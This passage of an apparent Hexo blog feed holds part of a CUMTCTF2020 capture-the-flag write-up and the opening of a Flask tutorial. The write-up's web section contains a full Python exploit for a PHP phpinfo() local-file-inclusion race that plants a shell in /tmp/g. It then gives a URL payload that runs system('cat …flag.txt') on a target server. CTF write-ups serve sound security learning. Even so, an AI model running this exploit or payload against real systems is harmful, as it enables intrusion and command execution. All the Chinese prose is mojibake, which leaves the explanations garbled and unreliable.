class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /index.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    self.event.set()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.197:13077&#x2F;?file&#x3D;&#x2F;tmp&#x2F;g&amp;1&#x3D;system(%27cat%20&#x2F;tmp&#x2F;7IDUrqGOt8PMATm852&#x2F;flag.txt%27);</span><br><span class="line">#CUMTCTF&#123;Orz_to_php1nf0&#125;</span><br></pre></td></tr></table></figure><p>æœ€åç›´æ¥å‘½ä»¤æ‰§è¡Œï¼Œä½†å¥½åƒæ‰¾äº†å¥½ä¹…æ‰çœ‹è§flag</p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="è¿ä¸ªç­¾åˆ°çš„åˆ†éƒ½ä¸ç»™ä½ "><a href="#è¿ä¸ªç­¾åˆ°çš„åˆ†éƒ½ä¸ç»™ä½ " class="headerlink" title="è¿ä¸ªç­¾åˆ°çš„åˆ†éƒ½ä¸ç»™ä½ "></a>è¿ä¸ªç­¾åˆ°çš„åˆ†éƒ½ä¸ç»™ä½ </h2><p>ç›´æ¥010æŸ¥çœ‹æœcumtctfå¯ä»¥çœ‹è§flag</p><h2 id="pythoné¢˜ç¦æ­¢py"><a href="#pythoné¢˜ç¦æ­¢py" class="headerlink" title="pythoné¢˜ç¦æ­¢py"></a>pythoné¢˜ç¦æ­¢py</h2><p>ç›´æ¥ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flag = input()</span></span><br><span class="line">cipher = [<span class="number">80</span>,<span class="number">70</span>,<span class="number">94</span>,<span class="number">71</span>,<span class="number">80</span>,<span class="number">71</span>,<span class="number">85</span>,<span class="number">104</span>,<span class="number">86</span>,<span class="number">39</span>,<span class="number">64</span>,<span class="number">106</span>,<span class="number">76</span>,<span class="number">67</span>,<span class="number">106</span>,<span class="number">71</span>,<span class="number">123</span>,<span class="number">92</span>,<span class="number">125</span>,<span class="number">76</span>,<span class="number">37</span>,<span class="number">106</span>,<span class="number">103</span>,<span class="number">118</span>,<span class="number">80</span>,<span class="number">35</span>,<span class="number">119</span>,<span class="number">32</span>,<span class="number">110</span>]</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># if(len(flag==29)):</span></span><br><span class="line"><span class="comment">#     for i,n in enumerate(flag):</span></span><br><span class="line"><span class="comment">#         if ord(n) ^ 19 != cipher[i]:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    a = i ^ <span class="number">19</span></span><br><span class="line">    print(chr(a),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><h2 id="å…„å¼Ÿä»¬å¿«æ¥å¸®å¸®è„è„"><a href="#å…„å¼Ÿä»¬å¿«æ¥å¸®å¸®è„è„" class="headerlink" title="å…„å¼Ÿä»¬å¿«æ¥å¸®å¸®è„è„"></a>å…„å¼Ÿä»¬å¿«æ¥å¸®å¸®è„è„</h2><p>è„±å£³æ‹–å…¥IDAå¯ä»¥çœ‹è§flag</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h2><p>nc ç›‘å¬é¢†flag</p><h2 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h2><p>è„±å…¥010å¹¶è¾“å…¥å­—ç¬¦ä¸²çœ‹æ˜¯ç›´æ¥å¯ä»¥bash</p><p>ç›´æ¥è¯»å–å°±å¯ä»¥æ‹¿flag</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="å¹¼å„¿å›­çš„å¯†ç é¢˜"><a href="#å¹¼å„¿å›­çš„å¯†ç é¢˜" class="headerlink" title="å¹¼å„¿å›­çš„å¯†ç é¢˜"></a>å¹¼å„¿å›­çš„å¯†ç é¢˜</h2><p>rsaï¼Œå·²çŸ¥e n c æ±‚m</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># e = 0x10001</span></span><br><span class="line"><span class="comment"># n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f</span></span><br><span class="line"><span class="comment"># c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hint ï¼š google RS</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c = <span class="number">0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d</span></span><br><span class="line">p = <span class="number">324350545929838254331191385863847627003</span></span><br><span class="line">q = <span class="number">328413456989577256301798468872388310877</span></span><br><span class="line">n = <span class="number">0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f</span></span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§flag</p><h2 id="å°å­¦ç”Ÿçš„å¯†ç é¢˜"><a href="#å°å­¦ç”Ÿçš„å¯†ç é¢˜" class="headerlink" title="å°å­¦ç”Ÿçš„å¯†ç é¢˜"></a>å°å­¦ç”Ÿçš„å¯†ç é¢˜</h2><p>è¿™ä¸ªå¾ˆæ˜æ˜¾å°±å¯ä»¥çœ‹å‡ºè§„å¾‹å°±æ˜¯ä¸€èˆ¬éƒ½æ˜¯ä»¥8å¼€å¤´</p><p>ç„¶åæˆ‘æœ‰ç‚¹æ‡’ï¼ˆè¯´å®è¯æ˜¯ä¸å¤ªä¼šå†™ï¼‰å°±ä¸€ä¸ªä¸€ä¸ªæ‹¼æ¥å‡ºflag</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="çœŸÂ·ç­¾åˆ°é¢˜"><a href="#çœŸÂ·ç­¾åˆ°é¢˜" class="headerlink" title="çœŸÂ·ç­¾åˆ°é¢˜"></a>çœŸÂ·ç­¾åˆ°é¢˜</h2><p>zipä¼ªåŠ å¯†ç„¶åbase64è§£å¯†æ‹¿flag</p><h2 id="åˆ«åšé¢˜äº†å¬æ­Œå§"><a href="#åˆ«åšé¢˜äº†å¬æ­Œå§" class="headerlink" title="åˆ«åšé¢˜äº†å¬æ­Œå§"></a>åˆ«åšé¢˜äº†å¬æ­Œå§</h2><p>mp3éšå†™</p><p>è¿™ä¸ªé¢˜å¯ä»¥  cumtæ˜¯å¯†ç </p><p>ç„¶åæ˜¯moseç¼–ç æˆ‘çœŸæ˜¯ä¸€ä¸ªä¸€ä¸ªæ‹¼çš„ï¼Œåº”è¯¥æ‹¿pythonè„šæœ¬å†™æ¯”è¾ƒå¥½ï¼Œæ¯•ç«Ÿpythoå­¦å¾—ä¸å¤ªå¥½</p><p>åº”è¯¥æ˜¯è¿™ä¸ªï¼Œæ‹¼é”™äº†å¥½å‡ å›</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUMTCTF&#123;M0RS38MORSE8M0RS38MORSE8M0RSE8AND8MP3ST39O&#125;</span><br></pre></td></tr></table></figure><h2 id="å¤§é²¨é±¼ä¹‹ä½ å¯åŠ²æ‰¾"><a href="#å¤§é²¨é±¼ä¹‹ä½ å¯åŠ²æ‰¾" class="headerlink" title="å¤§é²¨é±¼ä¹‹ä½ å¯åŠ²æ‰¾"></a>å¤§é²¨é±¼ä¹‹ä½ å¯åŠ²æ‰¾</h2><p>æµé‡åŒ…åˆ†æï¼Œç›´æ¥è·Ÿtcpæµå¯ä»¥çœ‹è§ä¸€ä¸ªç›²æ³¨çš„ä¼ è¾“å†…å®¹</p><p>æ˜¯äºŒåˆ†æ³•</p><p>ç„¶åæˆ‘å°±åˆåˆåˆè‡ªå·±æ‹¼å†™</p><p>æ‹¼é”™äº†å¥½å‡ å›</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUMTCTF&#123;cecc1394-6133-43d0-be06-a41c5f231dd4&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;CUMTCTF2020&quot;&gt;&lt;a href=&quot;#CUMTCTF2020&quot; class=&quot;headerlink&quot; title=&quot;CUMTCTF2020&quot;&gt;&lt;/a&gt;CUMTCTF2020&lt;/h1&gt;&lt;p&gt;ç¬¬ä¸€æ¬¡æ‰“æ¯”èµ›ï¼Œå¤§ä¸‰çš„å¸ˆå‚…ä»¬å¥½å¼º&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://pz1o.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://pz1o.top/tags/CTF/"/>
    
    <category term="é¢˜è§£" scheme="https://pz1o.top/tags/%E9%A2%98%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>pythonå¼€å‘</title>
    <link href="https://pz1o.top/2020/08/13/python%E5%BC%80%E5%8F%91/"/>
    <id>https://pz1o.top/2020/08/13/python%E5%BC%80%E5%8F%91/</id>
    <published>2020-08-13T11:20:57.000Z</published>
    <updated>2020-11-20T14:19:21.459Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é¡ºä¾¿å¤ä¹ ä¸€ä¸‹pythonï¼Œä¸»è¦æ˜¯æŒæ¡ä¸€ä¸‹pythonçš„ä¸»æµæ¡†æ¶ï¼ˆFlaskå’ŒDjango ï¼‰</p><h1 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h1><h2 id="URLå’Œè§†å›¾"><a href="#URLå’Œè§†å›¾" class="headerlink" title="URLå’Œè§†å›¾"></a>URLå’Œè§†å›¾</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä»flaskè¿™ä¸ªæ¡†æ¶ä¸­å¯¼å…¥Flaskè¿™ä¸ªç±»</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–ä¸€ä¸ªFlaskå¯¹è±¡</span></span><br><span class="line"><span class="comment"># Flask()</span></span><br><span class="line"><span class="comment"># éœ€è¦ä¼ é€’ä¸€ä¸ªå‚æ•°__name__</span></span><br><span class="line"><span class="comment"># 1. æ–¹ä¾¿flaskæ¡†æ¶å»å¯»æ‰¾èµ„æº</span></span><br><span class="line"><span class="comment"># 2. æ–¹ä¾¿flaskæ’ä»¶æ¯”å¦‚Flask-Sqlalchemyå‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œå¥½å»å¯»æ‰¾é—®é¢˜æ‰€åœ¨çš„ä½ç½®</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @app.routeæ˜¯ä¸€ä¸ªè£…é¥°å™¨</span></span><br><span class="line"><span class="comment"># @å¼€å¤´ï¼Œå¹¶ä¸”åœ¨å‡½æ•°çš„ä¸Šé¢ï¼Œè¯´æ˜æ˜¯è£…é¥°å™¨</span></span><br><span class="line"><span class="comment"># è¿™ä¸ªè£…é¥°å™¨çš„ä½œç”¨ï¼Œæ˜¯åšä¸€ä¸ªurlä¸è§†å›¾å‡½æ•°çš„æ˜ å°„</span></span><br><span class="line"><span class="comment"># 127.0.0.1:5000/   -&gt;  å»è¯·æ±‚hello_worldè¿™ä¸ªå‡½æ•°ï¼Œç„¶åå°†ç»“æœè¿”å›ç»™æµè§ˆå™¨</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'æˆ‘æ˜¯ç¬¬ä¸€ä¸ªflaskç¨‹åº'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœå½“å‰è¿™ä¸ªæ–‡ä»¶æ˜¯ä½œä¸ºå…¥å£ç¨‹åºè¿è¡Œï¼Œé‚£ä¹ˆå°±æ‰§è¡Œapp.run()</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">        <span class="comment"># app.run()</span></span><br><span class="line">        <span class="comment"># å¯åŠ¨ä¸€ä¸ªåº”ç”¨æœåŠ¡å™¨ï¼Œæ¥æ¥å—ç”¨æˆ·çš„è¯·æ±‚</span></span><br><span class="line">        <span class="comment"># while True:</span></span><br><span class="line">        <span class="comment">#  listen()</span></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®debugæ¨¡å¼"><a href="#è®¾ç½®debugæ¨¡å¼" class="headerlink" title="è®¾ç½®debugæ¨¡å¼"></a><strong>è®¾ç½®debugæ¨¡å¼</strong></h3><ol><li>åœ¨app.run()ä¸­ä¼ å…¥ä¸€ä¸ªå…³é”®å­—å‚æ•°debug,app.run(debug=True)ï¼Œå°±è®¾ç½®å½“å‰é¡¹ç›®ä¸ºdebugæ¨¡å¼ã€‚</li><li>debugæ¨¡å¼çš„ä¸¤å¤§åŠŸèƒ½ï¼š<ul><li>å½“ç¨‹åºå‡ºç°é—®é¢˜çš„æ—¶å€™ï¼Œå¯ä»¥åœ¨é¡µé¢ä¸­çœ‹åˆ°é”™è¯¯ä¿¡æ¯å’Œå‡ºé”™çš„ä½ç½®ã€‚</li><li>åªè¦ä¿®æ”¹äº†é¡¹ç›®ä¸­çš„<code>python</code>æ–‡ä»¶ï¼Œç¨‹åºä¼šè‡ªåŠ¨åŠ è½½ï¼Œä¸éœ€è¦æ‰‹åŠ¨é‡æ–°å¯åŠ¨æœåŠ¡å™¨ã€‚</li></ul></li></ol><h3 id="ä½¿ç”¨é…ç½®æ–‡ä»¶"><a href="#ä½¿ç”¨é…ç½®æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨é…ç½®æ–‡ä»¶"></a><strong>ä½¿ç”¨é…ç½®æ–‡ä»¶</strong></h3><ol><li>æ–°å»ºä¸€ä¸ª<code>config.py</code>æ–‡ä»¶</li><li>åœ¨ä¸»appæ–‡ä»¶ä¸­å¯¼å…¥è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”é…ç½®åˆ°<code>app</code>ä¸­ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import config</span><br><span class="line">app.config.from_object(config)</span><br></pre></td></tr></table></figure></li></ol><h3 id="URLä¼ å‚åˆ°è§†å›¾"><a href="#URLä¼ å‚åˆ°è§†å›¾" class="headerlink" title="URLä¼ å‚åˆ°è§†å›¾"></a><strong>URLä¼ å‚åˆ°è§†å›¾</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;user&#x2F;&lt;id&gt;&#39;)</span><br><span class="line">def users(id):</span><br><span class="line">    return u&#39;æ‚¨è¯·æ±‚çš„å‚æ•°æ˜¯ï¼š&#123;&#125;&#39;.format(id)</span><br><span class="line">#å‚æ•°éœ€è¦æ”¾åœ¨ä¸¤ä¸ªå°–æ‹¬å·ä¸­ã€‚</span><br><span class="line">#è§†å›¾å‡½æ•°ä¸­éœ€è¦æ”¾å’Œurlä¸­çš„å‚æ•°åŒåçš„å‚æ•°ã€‚</span><br></pre></td></tr></table></figure><h3 id="åè½¬URL"><a href="#åè½¬URL" class="headerlink" title="åè½¬URL"></a><strong>åè½¬URL</strong></h3><ol><li>ä»€ä¹ˆå«åšåè½¬URLï¼šä»è§†å›¾å‡½æ•°åˆ°urlçš„è½¬æ¢å«åšåè½¬url</li><li>åè½¬urlçš„ç”¨å¤„ï¼š<ul><li>åœ¨é¡µé¢é‡å®šå‘çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨urlåè½¬ã€‚</li><li>åœ¨æ¨¡æ¿ä¸­ï¼Œä¹Ÿä¼šä½¿ç”¨urlåè½¬ã€‚</li></ul></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,url_for</span><br><span class="line">print url_for(&#39;users&#39;,id&#x3D;&#39;1&#39;)</span><br></pre></td></tr></table></figure><p><strong>é¡µé¢è·³è½¬å’Œé‡å®šå‘</strong></p><p> ç”¨å¤„ï¼šåœ¨ç”¨æˆ·è®¿é—®ä¸€äº›éœ€è¦ç™»å½•çš„é¡µé¢çš„æ—¶å€™ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰ç™»å½•ï¼Œé‚£ä¹ˆå¯ä»¥è®©é‡å®šå‘åˆ°ç™»å½•é¡µé¢ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">form flask <span class="keyword">import</span> redirect,url_for</span><br><span class="line">url = url_for(<span class="string">'users'</span>)  usersæ˜¯è§†å›¾å‡½æ•°</span><br><span class="line">redirect(url)</span><br></pre></td></tr></table></figure><h2 id="jinja2æ¨¡æ¿"><a href="#jinja2æ¨¡æ¿" class="headerlink" title="jinja2æ¨¡æ¿"></a>jinja2æ¨¡æ¿</h2><h3 id="æ¨¡æ¿æ¸²æŸ“å’Œå‚æ•°"><a href="#æ¨¡æ¿æ¸²æŸ“å’Œå‚æ•°" class="headerlink" 